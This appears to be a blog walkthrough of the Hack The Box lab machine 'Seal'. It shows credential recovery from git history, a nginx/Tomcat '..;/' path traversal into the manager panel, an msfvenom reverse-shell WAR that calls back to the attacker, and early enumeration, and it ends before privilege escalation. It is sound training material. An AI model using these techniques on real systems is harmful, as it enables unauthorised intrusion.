<!doctype html><html lang="es"><head><title>Seal | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Medium machine. This machine contains a Tomcat website on top of nginx, which has a configuration vulnerability that leads to Remote Code Execution (RCE), then it has some misconfigurations related to file permissions and sudo commands. Knowledge about Tomcat exploitation and Linux file system is needed to compromise this machine"><meta itemprop="description" content="Hack The Box. Linux. Medium machine. This machine contains a Tomcat website on top of nginx, which has a configuration vulnerability that leads to Remote Code Execution (RCE), then it has some misconfigurations related to file permissions and sudo commands. Knowledge about Tomcat exploitation and Linux file system is needed to compromise this machine"><meta name="twitter:card" content="Hack The Box. Linux. Medium machine. This machine contains a Tomcat website on top of nginx, which has a configuration vulnerability that leads to Remote Code Execution (RCE), then it has some misconfigurations related to file permissions and sudo commands. Knowledge about Tomcat exploitation and Linux file system is needed to compromise this machine"><meta name="twitter:description" content="Hack The Box. Linux. Medium machine. This machine contains a Tomcat website on top of nginx, which has a configuration vulnerability that leads to Remote Code Execution (RCE), then it has some misconfigurations related to file permissions and sudo commands. Knowledge about Tomcat exploitation and Linux file system is needed to compromise this machine"><meta property="og:description" content="Hack The Box. Linux. Medium machine. This machine contains a Tomcat website on top of nginx, which has a configuration vulnerability that leads to Remote Code Execution (RCE), then it has some misconfigurations related to file permissions and sudo commands. Knowledge about Tomcat exploitation and Linux file system is needed to compromise this machine"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="7Rocky"><meta name="twitter:author" content="7Rocky"><meta property="og:author" content="7Rocky"><meta name="image" content="https://7rocky.github.io/images/HTB/Seal/Seal.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Seal/Seal.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Seal/Seal.png"><meta property="og:site_name" content="7Rocky"><meta itemprop="name" content="Seal"><meta property="twitter:title" content="Seal"><meta property="og:title" content="Seal"><meta property="og:url" content="https://7rocky.github.io/en/htb/seal/"><meta itemprop="keywords" content="git,sudo,nginx,tomcat,symlinks,file-permissions,directory-path-traversal,rce,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/monokai-sublime.min.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/highlight.min.js"></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/htb/seal/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/seal/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/seal/&text=Seal" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/en/htb/seal/&title=Seal" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Seal</h1><time class="mt4 f6 dib tracked" datetime="2021-11-13T00:00:00+01:00">13 / 11 / 2021</time><br><p class="mb4 f6 dib tracked">8 minutes to read</p></header><div class="htb-image"><img alt="Seal" src="/images/HTB/Seal/Seal.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/git" title="Git">Git</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/sudo" title="sudo">sudo</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/nginx" title="nginx">nginx</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/tomcat" title="Tomcat">Tomcat</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/symlinks" title="Symbolic links">Symbolic links</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/file-permissions" title="File permissions">File permissions</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/directory-path-traversal" title="Directory Path Traversal">Directory Path Traversal</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/rce" title="Remote Code Execution">Remote Code Execution</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#exploring-a-git-repository-in-gitbucket">Exploring a Git repository in GitBucket</a></li><li><a href="#finding-web-server-misconfigurations">Finding web server misconfigurations</a></li><li><a href="#foothold-on-the-machine">Foothold on the machine</a></li><li><a href="#lateral-movement-to-user-luis">Lateral movement to user <code>luis</code></a></li><li><a href="#privilege-escalation-with-sudo">Privilege escalation with <code>sudo</code></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Medium</li><li><strong>IP Address</strong>: 10.10.10.250</li><li><strong>Release</strong>: 10 / 07 / 2021</li></ul><h2 id="port-scanning">Port scanning</h2><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex"><span># Nmap 7.92 scan initiated as: nmap -sC -sV -oN nmap/targeted 10.10.10.250 -p 22,443,8080
</span></span><span style="display:flex"><span>Nmap scan report for 10.10.10.250
</span></span><span style="display:flex"><span>Host is up (0.032s latency).
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>PORT     STATE SERVICE    VERSION
</span></span><span style="display:flex"><span>22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
</span></span><span style="display:flex"><span>| ssh-hostkey:
</span></span><span style="display:flex"><span>|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)
</span></span><span style="display:flex"><span>|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)
</span></span><span style="display:flex"><span>|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
</span></span><span style="display:flex"><span>443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
</span></span><span style="display:flex"><span>|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span><span style="display:flex"><span>|_http-title: Seal Market
</span></span><span style="display:flex"><span>| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK 
</span></span><span style="display:flex"><span>| Not valid before: 2021-05-05T10:24:03
</span></span><span style="display:flex"><span>|_Not valid after:  2022-05-05T10:24:03
</span></span><span style="display:flex"><span>| tls-alpn:
</span></span><span style="display:flex"><span>|_  http/1.1
</span></span><span style="display:flex"><span>| tls-nextprotoneg:
</span></span><span style="display:flex"><span>|_  http/1.1
</span></span><span style="display:flex"><span>8080/tcp open  http-proxy
</span></span><span style="display:flex"><span>| fingerprint-strings:
</span></span><span style="display:flex"><span>|   FourOhFourRequest:
</span></span><span style="display:flex"><span>|     HTTP/1.1 401 Unauthorized
</span></span><span style="display:flex"><span>|     Date: Sun, 11 Jul 2021 20:12:53 GMT
</span></span><span style="display:flex"><span>|     Set-Cookie: JSESSIONID=node06lh8n576egh211y0xv2rr2r3i2.node0; Path=/; HttpOnly
</span></span><span style="display:flex"><span>|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
</span></span><span style="display:flex"><span>|     Content-Type: text/html;charset=utf-8
</span></span><span style="display:flex"><span>|     Content-Length: 0
</span></span><span style="display:flex"><span>...
</span></span><span style="display:flex"><span>| http-auth:
</span></span><span style="display:flex"><span>| HTTP/1.1 401 Unauthorized\x0D
</span></span><span style="display:flex"><span>|_  Server returned status 401 but no WWW-Authenticate header.
</span></span><span style="display:flex"><span>|_http-title: Site doesn&#39;t have a title (text/html;charset=utf-8).
</span></span><span style="display:flex"><span>...
</span></span><span style="display:flex"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex"><span>
</span></span><span style="display:flex"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex"><span># Nmap done -- 1 IP address (1 host up) scanned in 17.11 seconds
</span></span></code></pre></div><p>This machine has ports 22 (SSH), 443 (HTTPS) and 8080 (HTTP) open.</p><h2 id="exploring-a-git-repository-in-gitbucket">Exploring a Git repository in GitBucket</h2><p>The machine has a GitBucket on port 8080:</p><p><img src="/images/HTB/Seal/Seal-git-login.png" alt="GitBucket login"></p><p>To enter, we can create an account. After that, we need to login and we will se two repositories: <code>root/seal_market</code> and <code>root/infra</code>:</p><p><img src="/images/HTB/Seal/Seal-git.png" alt="GitBucket repositories"></p><p>We can find some hints in the <code>README.md</code> file of <code>root/seal_market</code> related to Tomcat configuration:</p><p><img src="/images/HTB/Seal/Seal-market.png" alt="root/seal_market repository"></p><p>Furthermore, there are some issues in the same repository talking about mutual authentication between nginx and Tomcat:</p><p><img src="/images/HTB/Seal/Seal-git-messages.png" alt="root/seal_market issues"></p><p>It is well-known that Tomcat handles autentication and authorization using a file called <code>tomcat-users.xml</code> (which is part of Tomcat comfiguration). The repository contains this file, but the current version does not include any sensitive information (maybe it has been updated because it was a task in the <code>README.md</code>):</p><p><img src="/images/HTB/Seal/Seal-git-master.png" alt="tomcat-users master"></p><p>However, there is a previous commit that contains a password. We can see this old version using the &ldquo;History&rdquo; button:</p><p><img src="/images/HTB/Seal/Seal-git-tomcat-pw.png" alt="tomcat-users old"></p><p>We can also view this old commit using the <code>git</code> command-line interface. For that, we need to clone the repository using the previously registered account:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ git clone http://10.10.10.250:8080/git/root/seal_market.git 
</span></span></code></pre></div><p>Then, using <code>git log</code> we can see all the commits related to file <code>tomcat-users.xml</code>. Using some shell scripting we can filter the password:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ git log -p tomcat/tomcat-users.xml | grep manager | grep password
</span></span><span style="display:flex"><span>-&lt;user username=&#34;tomcat&#34; password=&#34;42MrHBf*z8{Z%&#34; roles=&#34;manager-gui,admin-gui&#34;/&gt; 
</span></span><span style="display:flex"><span>+&lt;user username=&#34;tomcat&#34; password=&#34;42MrHBf*z8{Z%&#34; roles=&#34;manager-gui,admin-gui&#34;/&gt;
</span></span></code></pre></div><p>This password curiously works to login as <code>luis</code> in GitBucket, but there is nothing to do there as <code>luis</code>.</p><h2 id="finding-web-server-misconfigurations">Finding web server misconfigurations</h2><p>On port 443 we can see a website like this:</p><p><img src="/images/HTB/Seal/Seal-https.png" alt="HTTPS Seal website"></p><p>If we trigger a 404 Not Found error, we see that the server is running Apache Tomcat/9.0.31:</p><p><img src="/images/HTB/Seal/Seal-404-Tomcat.png" alt="Tomcat 404 Not Found"></p><p>There are some weird configurations in the web servers, because they are using both Tomcat and nginx at the same time. The nginx server was reported by <code>nmap</code>, and we also saw some clues on GitBucket. The same applies to Tomcat.</p><p>This can cause issues as nginx will normalize paths like <code>/../</code> to <code>/</code> but will not change paths like <code>/..;/</code>. However, Tomcat will convert <code>/..;/</code> to <code>/../</code>, making possible to perform a Directory Path Traversal (more information <a href="https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/">here</a>):</p><p><img src="/images/HTB/Seal/Seal-Tomcat-401.png" alt="Tomcat Authentication"></p><p>With this vulnerability and the password found on GitBucket, we are able to enter <code>/manager/html</code> from <code>/manager/status/..;/html</code> and access the administration panel.</p><p><img src="/images/HTB/Seal/Seal-Tomcat-manager.png" alt="Tomcat Manager"></p><h2 id="foothold-on-the-machine">Foothold on the machine</h2><p>Now, we are able to upload a malicious WAR file from <code>/manager/status/..;/html</code>, using <code>msfvenom</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ msfvenom -p java/jsp_shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.17.44 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f war -o reverse.war 
</span></span><span style="display:flex"><span>Payload size: 1091 bytes
</span></span><span style="display:flex"><span>Final size of war file: 1091 bytes
</span></span><span style="display:flex"><span>Saved as: reverse.war
</span></span></code></pre></div><p>Nevertheless, when doing the POST request, it has to be done again changing the URL to <code>/manager/status/..;/html/uploads</code> (because we are not allowed to use <code>/manager/html/uploads</code> directly) as shown in Burp Suite:</p><p><img src="/images/HTB/Seal/Seal-Burp-403.png" alt="Burp Suite 403 upload"></p><p>Using Burp Suite, we can change the URL before sending the actual request:</p><p><img src="/images/HTB/Seal/Seal-Burp-200.png" alt="Burp Suite 200 upload"></p><p>We can check that the WAR has been uploaded successfully going again to <code>/manager/status/..;/html</code>:</p><p><img src="/images/HTB/Seal/Seal-reverse-war.png" alt="WAR file uploaded"></p><p>Then, using <code>nc</code> we get access to the machine as user <code>tomcat</code> when loading <code>/reverse</code> from he Tomcat manager panel:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>$ nc -nlvp <span style="color:#ae81ff">4444</span>
</span></span><span style="display:flex"><span>Ncat: Version 7.92 ( https://nmap.org/ncat )
</span></span><span style="display:flex"><span>Ncat: Listening on :::4444
</span></span><span style="display:flex"><span>Ncat: Listening on 0.0.0.0:4444
</span></span><span style="display:flex"><span>Ncat: Connection from 10.10.10.250.
</span></span><span style="display:flex"><span>Ncat: Connection from 10.10.10.250:48774.
</span></span><span style="display:flex"><span>script /dev/null -c bash
</span></span><span style="display:flex"><span>Script started, file is /dev/null
</span></span><span style="display:flex"><span>tomcat@seal:/var/lib/tomcat9$ ^Z
</span></span><span style="display:flex"><span>zsh: suspended  ncat -nlvp 4444
</span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex"><span><span style="color:#960050;background-color:#1e0010"></span>$ stty raw -echo; fg
</span></span><span style="display:flex"><span>[1]  + continued  ncat -nlvp 4444
</span></span><span style="display:flex"><span>                                 reset xterm
</span></span><span style="display:flex"><span>tomcat@seal:/var/lib/tomcat9$ export TERM=xterm
</span></span><span style="display:flex"><span>tomcat@seal:/var/lib/tomcat9$ export SHELL=bash
</span></span><span style="display:flex"><span>tomcat@seal:/var/lib/tomcat9$ stty rows 50 columns 158 
</span></span></code></pre></div><h2 id="lateral-movement-to-user-luis">Lateral movement to user <code>luis</code></h2><p>We can see that there is a user called <code>luis</code> by reading <code>/etc/passwd</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>tomcat@seal:/var/lib/tomcat9$ grep &#39;sh$&#39; /etc/passwd
</span></span><span style="display:flex"><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style="display:flex"><span>luis:x:1000:1000:,,,:/home/luis:/bin/bash
</span></span><span style="display:flex"><span>tomcat@seal:/var/lib/tomcat9$ ls -la /home/luis
</span></span><span style="display:flex"><span>total 51324
</span></span><span style="display:flex"><span>drwxr-xr-x 9 luis luis     4096 Oct 25 19:51 .
</span></span><span style="display:flex"><span>drwxr-xr-x 3 root root     4096 May  5 12:52 ..
</span></span><span style="display:flex"><span>drwxrwxr-x 3 luis luis     4096 May  7 06:00 .ansible
</span></span><span style="display:flex"><span>lrwxrwxrwx 1 luis luis        9 May  5 12:57 .bash_history -&gt; /dev/null 
</span></span><span style="display:flex"><span>-rw-r--r-- 1 luis luis      220 May  5 12:52 .bash_logout
</span></span><span style="display:flex"><span>-rw-r--r-- 1 luis luis     3797 May  5 12:52 .bashrc
</span></span><span style="display:flex"><span>drwxr-xr-x 3 luis luis     4096 May  7 07:00 .cache
</span></span><span style="display:flex"><span>drwxrwxr-x 3 luis luis     4096 May  5 13:45 .config
</span></span><span style="display:flex"><span>drwxrwxr-x 6 luis luis     4096 Oct 25 19:19 .gitbucket
</span></span><span style="display:flex"><span>-rw-r--r-- 1 luis luis 52497951 Jan 14  2021 gitbucket.war
</span></span><span style="display:flex"><span>drwxrwxr-x 3 luis luis     4096 May  5 13:41 .java
</span></span><span style="display:flex"><span>drwxrwxr-x 3 luis luis     4096 May  5 14:33 .local
</span></span><span style="display:flex"><span>-rw-r--r-- 1 luis luis      807 May  5 12:52 .profile
</span></span><span style="display:flex"><span>drwx------ 2 luis luis     4096 May  7 06:10 .ssh
</span></span><span style="display:flex"><span>-r-------- 1 luis luis       33 Oct 25 19:19 user.txt
</span></span></code></pre></div><p>Searching for files belonging to user <code>luis</code>, we find that there is an Ansible Playbook to backup a part of the Tomcat webapp, which will be stored periodically at <code>/opt/backups/archives</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-console" data-lang="console"><span style="display:flex"><span>tomcat@seal:/var/lib/tomcat9$ find / -user luis 2&gt;/dev/null | grep -vE &#39;proc|/\.&#39; 
</span></span><span style="display:flex"><span>/opt/backups
</span></span><span style="display:flex"><span>/opt/backups/archives
</span></span><span style="display:flex"><span>/opt/backups/archives/backup-2021-07-15-15:50:33.gz
</span></span><span style="display:flex"><span>/opt/backups/archives/backup-2021-07-15-15:53:32.gz
</span></span><span style="display:flex"><span>/opt/backups/archives/backup-2021-07-15-15:52:32.gz
</span></span><span style="display:flex"><span>/opt/backups/archives/backup-2021-07-15-15:51:32.gz
</span></span><span style="display:flex"><span>/opt/backups/playbook
</span></span><span style="display:flex"><span>/opt/backups/playbook/run.yml
</span></span><span style="display:flex"><span>/home/luis
</span></span><span style="display:flex"><span>/home/luis/user.txt
</span></span><span style="display:flex"><span>/home/luis/gitbucket.war
</span></span><span style="display:flex"><span>tomcat@seal:/var/lib/tomcat9$ cat /opt/backups/playbook/run.yml
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-yaml" data-lang="yaml"><span style="display:flex"><span>- <span style="color:#f92672">hosts</span>: <span style="color:#ae81ff">localhost</span>
</span></span><span style="display:flex"><span>  <span style="color:#f92672">tasks</span>:
</span></span><span style="display:flex"><span>  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Copy Files</span>
</span></span><span style="display:flex"><span>    <span style="color:#f92672">synchronize</span>: <span style="color:#ae81ff">src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes </span>
</span></span><span style="display:flex"><span>  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Server Backups</span>
</span></span><span style="display:flex"><span>    <span style="color:#f92672">archive</span>:
</span></span><span style="display:flex"><span>      <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/opt/backups/files/</span>
</span></span><span style="display:flex"><span>      <span style="color:#f92672">dest</span>: <span style="color:#e6db74">&#34;/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz&#34;</span>
</span></span><span style="display:flex"><span>  - <span style="color:#f92672">name</span>: <span style="color:#ae81ff">Clean</span>
</span></span><span style="display:flex"><span>    <span style="color:#f92672">file</span>:
</span></span><span style="display:flex"><span>      <span style="color:#f92672">state</span>: <span style="color:#ae81ff">absent</span>
</span></span><span style="display:flex"><span>      <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/opt/backups/files/</span>
